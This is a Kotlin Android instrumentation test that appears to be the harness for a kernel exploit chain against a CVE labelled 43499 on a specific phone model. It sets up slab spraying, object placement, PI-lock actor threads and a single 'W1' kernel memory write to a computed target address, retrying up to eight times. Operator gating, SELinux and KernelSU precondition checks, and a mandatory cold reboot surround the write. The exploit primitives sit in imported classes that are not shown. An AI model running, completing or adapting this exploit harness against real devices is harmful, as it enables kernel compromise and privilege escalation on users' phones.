package com.ghostlock.app.backend.cve43499.victim

import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteChainPolicy
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteStageId
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteTransactionRunner
import com.ghostlock.app.backend.cve43499.isRetryableCleanFailure
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteTransactionStep
import com.ghostlock.app.backend.cve43499.generator.Cve43499RouteGeneratorFactory
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteGenerator
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499Lifecycle
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.data.cve43499.A301SoDebugConfig
import com.ghostlock.app.jni.Native43499ActorSetup
import java.io.File
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Assume
import org.junit.Test
import org.junit.runner.RunWith

/**
 * E1 W1-only 真机 harness（debug androidTest；**默认 SKIP，仅 Lead 明确 go 后运行**）。
 *
 * 安全边界：
 * - opt-in 双参数：`-e e1 true -e e1_ack W1_WRITE_ACK`；缺任一 ⇒ JUnit skipped；
 * - 运行前断言 E0 条件（KSU 未加载、SELinux Enforcing、冷机 uptime、非 Doze）；
 * - **只执行一次 W1 写事务**（preparePlacement→generator→landPage→prepareActor→
 *   executeActor）；不 W1b/W2/W3、不 spawn victim、不 perf；
 * - W1 成功 ⇒ 记录证据后**强制 fail-stop**并输出 `rollback=REQUIRED_COLD_REBOOT`
 *   （app 域无法 `setenforce 1`；Lead go 计划必须包含立即冷重启）；
 * - W1 失败/RouteMiss ⇒ 记录具名 reason，尝试 closeChain 终止资源，不继续；
 * - 失败即停，不自动重试；pstore 路径只读记录（无 root 通常不可读）。
 *
 * @note 阶段：task-56 B（harness 就绪，**本批不运行**）；设备 A301SO。
 * @note 这是攻击关键路径 harness；未获 Lead/用户明确 go 前禁止 `e1=true`。
 */
@RunWith(AndroidJUnit4::class)
class W1OnlyProbeTest {

    @Test
    fun w1OnlyJniProbe() {
        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val args = InstrumentationRegistry.getArguments()
        Assume.assumeTrue(
            "E1 W1-only 未 opt-in：需 Lead 明确 go 且 -e e1 true -e e1_ack W1_WRITE_ACK",
            args.getString("e1") == "true" && args.getString("e1_ack") == "W1_WRITE_ACK",
        )
        val context = instrumentation.targetContext
        val lines = mutableListOf<String>()

        fun record(line: String) {
            lines += line
            android.util.Log.i(TAG, line)
        }

        val report = File(context.filesDir, REPORT_FILE)
        try {
            e0Preconditions(context, ::record)
            runW1Only(::record)
        } finally {
            report.writeText(lines.joinToString("\n"))
            record("E1|report_file=${report.absolutePath}|lines=${lines.size}")
        }
    }

    /**
     * E0 前置条件：KSU 未加载、Enforcing、冷机窗口、非 Doze。
     *
     * @param context target context。
     * @param record 记录器。
     */
    private fun e0Preconditions(
        context: android.content.Context,
        record: (String) -> Unit,
    ) {
        record("E1|device|model=${android.os.Build.MODEL}|fingerprint=${android.os.Build.FINGERPRINT}")
        record("E1|kernel=${System.getProperty("os.version")}|uid=${android.os.Process.myUid()}")
        val selfAttr = readProc("/proc/self/attr/current").trimEnd('\u0000')
        record("E1|selinux_self=$selfAttr|enforce_file=${readProc("/sys/fs/selinux/enforce")}")
        val enforced: Boolean? = runCatching {
            val type = Class.forName("android.os.SELinux")
            type.getMethod("isSELinuxEnforced").invoke(null) as? Boolean
        }.getOrNull()
        val enforceFile = readProc("/sys/fs/selinux/enforce")
        /* app 域通常读不到 enforce 文件；SELinux API 在不可读时返回 false（≠Permissive）。
         * 允许 operator 在 adb shell 先核 `getenforce=Enforcing` 后传
         * `-e e1_enforce_enforcing true` 作为 fallback 证明。 */
        val externalEnforceAck = InstrumentationRegistry.getArguments()
            .getString("e1_enforce_enforcing") == "true"
        val enforceProof = when {
            enforced == true -> "selinux-api"
            enforceFile == "1" -> "enforce-file"
            externalEnforceAck && selfAttr.contains("untrusted_app") -> "external-shell-ack"
            else -> "none"
        }
        record(
            "E1|selinux|api=$enforced|enforce_file=$enforceFile|proof=$enforceProof" +
                "|external_ack=$externalEnforceAck",
        )
        assertTrue(
            "E1|未能证明 Enforcing：api=$enforced file=$enforceFile external_ack=$externalEnforceAck",
            enforceProof != "none",
        )
        assertTrue("E1|app 域异常：$selfAttr", selfAttr.contains("untrusted_app"))

        /* Lead 2026-10-27 裁定：KSU **kernel 侧 absent** 即满足 E1 前置；
         * `/data/adb/ksu` userspace 残留只记录（不加载模块即可）。 */
        val ksuPaths = listOf("/data/adb/ksu", "/data/adb/modules", "/data/adb/ksud")
        val existing = ksuPaths.filter { path ->
            runCatching { File(path).exists() }.getOrDefault(true)
        }
        val ksuModules = runCatching { File("/proc/modules").readLines() }
            .getOrDefault(emptyList())
            .filter { it.contains("kernelsu", true) || it.contains("ksud", true) }
        val sysModuleKsu = runCatching {
            File("/sys/module").list()?.filter { name ->
                name.contains("ksu", true) || name.contains("kernelsu", true)
            }.orEmpty()
        }.getOrDefault(emptyList())
        record(
            "E1|ksu|existing_userspace_paths=$existing|module_lines=${ksuModules.size}" +
                "|sys_module_ksu=$sysModuleKsu" +
                "|proc_modules_lines=${runCatching { File("/proc/modules").readLines().size }.getOrDefault(-1)}",
        )
        assertTrue("E1|KSU 内核模块可见，拒绝 E1: $ksuModules", ksuModules.isEmpty())
        assertTrue("E1|KSU 内核模块目录可见，拒绝 E1: $sysModuleKsu", sysModuleKsu.isEmpty())

        /* app 域读不到 /proc/uptime；用 SystemClock.elapsedRealtime()（含睡眠）作
         * 冷机标记（operator 侧另有 adb shell uptime 记录用于对拍）。 */
        val elapsedSeconds = android.os.SystemClock.elapsedRealtime() / 1000L
        record(
            "E1|cold_boot|elapsed_realtime_s=$elapsedSeconds|proc_uptime=${readProc("/proc/uptime")}" +
                "|max=${COLD_BOOT_MAX_SECONDS}",
        )
        assertTrue(
            "E1|非冷机（elapsedRealtime=${elapsedSeconds}s > ${COLD_BOOT_MAX_SECONDS}s）：应冷启动后运行",
            elapsedSeconds <= COLD_BOOT_MAX_SECONDS,
        )
        val power = context.getSystemService(android.os.PowerManager::class.java)
        record(
            "E1|power|interactive=${power?.isInteractive}|device_idle=${power?.isDeviceIdleMode}" +
                "|power_save=${power?.isPowerSaveMode}",
        )
        assertTrue("E1|设备非交互态/Doze，拒绝 E1", power?.isInteractive == true && power.isDeviceIdleMode.not())
        record("E1|pstore|exists=${runCatching { File("/sys/fs/pstore").exists() }.getOrDefault(false)}")
    }

    /**
     * W1-only：一次写事务（仅 W1）；不 W1b/W2/W3、不 spawn victim。
     *
     * @param record 记录器。
     */
    private fun runW1Only(record: (String) -> Unit) {
        val context = InstrumentationRegistry.getInstrumentation().targetContext
        val debug = A301SoDebugConfig.load(context)
        record(
            "E1|debug_profile|release=${debug.release}|kernel_major=${debug.kernelMajor}" +
                "|primitive=${debug.injection.primitive}|mm_struct_sz=${debug.kernelsnitch.mmStructSz}",
        )
        val execution = A301SoDebugConfig.executionParameters(debug)
        val ghostPid = android.os.Process.myPid()
        /* task-119：实际 W1 target 进 E1 report/evidence（临时实验键可覆盖）。 */
        val w1Target = com.ghostlock.app.backend.cve43499.generator.Cve43499GeneratorContext(
            debug,
            execution,
            ghostPid,
        ).w1WriteRequest().target
        record(
            "E1|target|w1=0x${java.lang.Long.toUnsignedString(w1Target, 16)}" +
                "|override=" + (
                    debug.generator.writeTargetOverride?.let {
                        "0x" + java.lang.Long.toUnsignedString(it, 16)
                    } ?: "unset"
                ),
        )
        val generator = Cve43499RouteGeneratorFactory.create(debug, execution, ghostPid) as? Cve43499WriteGenerator
            ?: error("E1|generator 非 WriteGenerator：${debug.injection.primitive}")
        val planner = Cve43499RouteGeneratorFactory.createPlanner(debug, execution, ghostPid)
        val policy = Cve43499WriteChainPolicy.fromDebug(
            A301SoDebugConfig.writeChainParameters(),
            debug.injection.primitive,
        )
        val allocation = execution.allocationSize
        val objects = (allocation / execution.mmStructSize).toInt()
        val placement = PlacementConfig(
            placementCpu = execution.placementCpu,
            measurementCpu = execution.measurementCpu,
            timeoutNanos = execution.timeoutNanos,
            pageSize = execution.pageSize,
            allocationSize = allocation,
            slabOrder = execution.slabOrder,
            mmStructSize = execution.mmStructSize,
            mmPartials = execution.mmPartials,
            prepareSlabs = execution.prepareSlabs,
            snitchCollisions = debug.kernelsnitch.collisions.toLong(),
            pollUs = execution.pollUs,
            requiredAlignment = execution.requiredAlignment,
            scanLowerBound = execution.scanLowerBound,
            scanUpperBound = execution.scanUpperBound,
            scanStep = execution.scanStep,
            scanRoundLimit = execution.scanRoundLimit,
            objectsPerSlab = objects,
            prepareObjectCount = objects * execution.prepareSlabs.toInt(),
            sprayObjectCount = objects * (1 + execution.mmPartials.toInt()),
            preObjectCount = objects - 1,
            postObjectCount = objects,
            identityStart = execution.identityStart,
            identityEnd = execution.identityEnd,
            leakTagNibble = execution.leakTagNibble,
            leakTagShift = execution.leakTagShift,
            stagingCapacity = execution.stagingCapacity,
            maxContextEntries = execution.maxContextEntries,
            maxObjectsPerSlab = execution.maxObjectsPerSlab,
            maxMeasurementRounds = execution.maxMeasurementRounds,
        )
        val actorSetup = Native43499ActorSetup(
            ownerCpu = execution.ownerCpu,
            waiterCpu = execution.waiterCpu,
            consumerCpu = execution.consumerCpu,
            ownerPriority = execution.ownerPriority,
            waiterPriority = execution.waiterPriority,
            consumerPriority = execution.consumerPriority,
            threadCount = execution.threadCount,
            prepareTimeoutNanos = execution.prepareTimeoutNanos,
            parkedTimeoutNanos = execution.parkedTimeoutNanos,
            executionTimeoutNanos = execution.executionTimeoutNanos,
            shutdownTimeoutNanos = execution.shutdownTimeoutNanos,
            consumerMax = execution.consumerMax,
            consumerBurst = execution.consumerBurst,
            lockPiSpinNs = execution.lockPiSpinNs,
            pollUs = execution.pollUs,
            setupSettleUs = execution.setupSettleUs,
            requeueExpected = execution.requeueExpected,
            disarmSpinLimit = execution.disarmSpinLimit,
        )
        record("E1|begin|primitive=${debug.injection.primitive}|ghost_pid=$ghostPid")
        /* task-94/95：page-accept clean failure 是 legacy 语义下**预期可重试**的 RouteMiss
         * （core page.c：page_accept_required=1 且 (base+offset)>>16&1==0 拒绝本次页，
         * token 恢复、未写、无 panic）。E1 harness 单次 execute ⇒ 冷机 ~50% FAIL；本批：
         * - 每 attempt **全新** `Cve43499Lifecycle`+runner（前一 attempt close 后丢弃，
         *   避免 124s 轮次里 placement 资源退化/残留影响下一 attempt）；
         * - attempt 间 250ms settle；上限 8（task-95 收紧；debug w1Attempts=15 仅为候选上限来源）；
         * - 仅 landing clean-failure 重试，其它 RouteMiss/Failed 立即 FAIL。 */
        val retryLimit = minOf(
            maxOf(policy.w1Attempts, A301SoDebugConfig.writeChainParameters().w1Attempts),
            8,
        )
        var attempt = 0
        var result: Cve43499WriteTransactionStep.Executed? = null
        var lastRouteMissReason: String? = null
        while (attempt < retryLimit && result == null) {
            attempt++
            record(
                "E1|attempt|n=$attempt|phase=pre|reason=begin" +
                    "|primitive=${debug.injection.primitive}|proc=${procStatusEvidence()}",
            )
            val lifecycle = Cve43499Lifecycle()
            startCarrierMonitor(context, lifecycle)
            val runner = Cve43499WriteTransactionRunner(
                lifecycle = lifecycle,
                writeGenerator = generator,
                placement = placement,
                actorSetup = actorSetup,
                policy = policy,
            )
            val outcome = try {
                runner.execute(Cve43499WriteStageId.W1, planner.w1())
            } finally {
                /* 只终止本 attempt 资源（closeChain），不执行 W1b/W2/W3、不 spawn victim。 */
                val receipt = lifecycle.closeChain()
                record(
                    "E1|attempt|n=$attempt|phase=close" +
                        "|reason=close_chain|retained=${receipt.retained}" +
                        "|all_released=${receipt.allReleased}" +
                        "|termination=${receipt.termination}",
                )
            }
            carrierMonitorRunning.set(false)
            when (outcome) {
                is Cve43499WriteTransactionStep.Executed -> {
                    result = outcome
                    record(
                        "E1|attempt|n=$attempt|phase=executed" +
                            "|reason=executed|primitive=${outcome.primitiveKind}" +
                            "|page_base=0x${java.lang.Long.toHexString(outcome.facts.candidatePageBase)}",
                    )
                }
                is Cve43499WriteTransactionStep.RouteMiss -> {
                    lastRouteMissReason = outcome.reason
                    record(
                        "E1|attempt|n=$attempt|phase=${phaseOf(outcome.reason)}" +
                            "|reason=${outcome.reason}|primitive=${outcome.primitiveKind}" +
                            "|page_base=none",
                    )
                    if (!isRetryableCleanFailure(outcome.reason)) {
                        fail(
                            "E1|W1-FAILED|route_miss=${outcome.reason}" +
                                "|primitive=${outcome.primitiveKind}|attempt=$attempt",
                        )
                    }
                    record(
                        "E1|attempt|n=$attempt|residual|${residualEvidence()}",
                    )
                    if (attempt < retryLimit) Thread.sleep(ATTEMPT_SETTLE_MS)
                }
                is Cve43499WriteTransactionStep.Failed -> fail(
                    "E1|W1-FAILED|reason=${outcome.reason}|retained=${outcome.retained}" +
                        "|attempt=$attempt",
                )
            }
        }
        val completed = result
        if (completed == null) {
            fail(
                "E1|W1-FAILED|retries_exhausted|attempts=$attempt" +
                    "|last_route_miss=${lastRouteMissReason ?: "none"}",
            )
            return
        }
        record(
            "E1|W1|executed|attempts=$attempt|primitive=${completed.primitiveKind}" +
                "|consumer_success=${completed.consumerSuccess}" +
                "|reclaim_sends=${completed.reclaimSends}" +
                "|carrier_armed=${completed.carrierArmed}" +
                "|carrier_ops=${completed.carrierOperations}" +
                "|last_step=${completed.carrierLastStep}" +
                "|last_errno=${completed.carrierLastErrno}" +
                "|page_base=0x${java.lang.Long.toHexString(completed.facts.candidatePageBase)}",
        )
        record(
            "E1|enforce_after|file=${readProc("/sys/fs/selinux/enforce")}" +
                "|self_attr=${readProc("/proc/self/attr/current").trimEnd('\u0000')}",
        )
        fail(
            "E1_W1_WRITE_OBSERVED|rollback=REQUIRED_COLD_REBOOT|" +
                "attempts=$attempt|evidence=report/logcat；立即冷重启，禁止继续 E2/E5",
        )
    }

    /**
     * @param reason RouteMiss reason。
     * @return 失败相位（placement/landing/other），用于逐 attempt 诊断。
     */
    private fun phaseOf(reason: String): String = when {
        reason.startsWith("placement:") -> "placement"
        reason.contains("landing") -> "landing"
        reason.contains("prepare-actor") -> "prepare-actor"
        reason.contains("actor-execute") -> "actor-execute"
        else -> "other"
    }

    /**
     * @return 残留证据（task-102：threads/fds/children；actor 超时后重试前记录）。
     */
    private fun residualEvidence(): String {
        val threads = runCatching { File("/proc/self/task").list()?.size }.getOrNull() ?: -1
        val fds = runCatching { File("/proc/self/fd").list()?.size }.getOrNull() ?: -1
        var children = 0
        runCatching {
            File("/proc/self/task").listFiles()?.forEach { task ->
                val text = File(task, "children").readText().trim()
                if (text.isNotEmpty()) children += text.split(' ').count { it.isNotBlank() }
            }
        }
        return "threads=$threads|fds=$fds|children=$children"
    }

    /**
     * @return `/proc/self/status` Threads/VmSize + fd 数（attempt 前 debug 证据）。
     */
    private fun procStatusEvidence(): String {
        val status = runCatching { File("/proc/self/status").readText() }.getOrDefault("")
        val threads = status.lineSequence().firstOrNull { it.startsWith("Threads:") }
            ?.removePrefix("Threads:")?.trim() ?: "unknown"
        val vmSize = status.lineSequence().firstOrNull { it.startsWith("VmSize:") }
            ?.removePrefix("VmSize:")?.trim() ?: "unknown"
        val fds = runCatching { File("/proc/self/fd").list()?.size }.getOrNull() ?: -1
        return "threads=$threads|vmsize=$vmSize|fds=$fds"
    }


    /**
     * Step C（task-113）：carrier 崩溃前快照监控（Kotlin IO/fsync，每 100ms）。
     */
    private fun startCarrierMonitor(
        context: android.content.Context,
        lifecycle: Cve43499Lifecycle,
    ) {
        carrierMonitorRunning.set(true)
        val file = File(context.filesDir, "e1-carrier-trace.txt")
        val thread = Thread {
            while (carrierMonitorRunning.get()) {
                val snapshot = lifecycle.actorDebugSnapshot()
                val line = "E1|carrier|ts=${System.currentTimeMillis()}|" +
                    (snapshot?.joinToString("/") ?: "none") + "\n"
                runCatching {
                    java.io.FileOutputStream(file, true).use { stream ->
                        stream.write(line.toByteArray())
                        stream.flush()
                        stream.fd.sync()
                    }
                }
                try {
                    Thread.sleep(100L)
                } catch (interrupted: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@Thread
                }
            }
        }
        thread.isDaemon = true
        thread.start()
    }

    /**
     * @param path /proc 文件。
     * @return 内容；不可读返回 "unreadable"。
     */
    private fun readProc(path: String): String =
        runCatching { File(path).readText().trim() }.getOrDefault("unreadable")

    /** Step C：carrier 监控线程运行开关（per class，attempt 间复用）。 */
    private val carrierMonitorRunning: java.util.concurrent.atomic.AtomicBoolean =
        java.util.concurrent.atomic.AtomicBoolean(false)

    private companion object {
        const val TAG = "E1-W1-ONLY"
        const val REPORT_FILE = "e1-w1-only-report.txt"
        const val COLD_BOOT_MAX_SECONDS = 1_800

        /** task-95：attempt 间有界 settle（毫秒）。 */
        const val ATTEMPT_SETTLE_MS: Long = 250L
    }
}
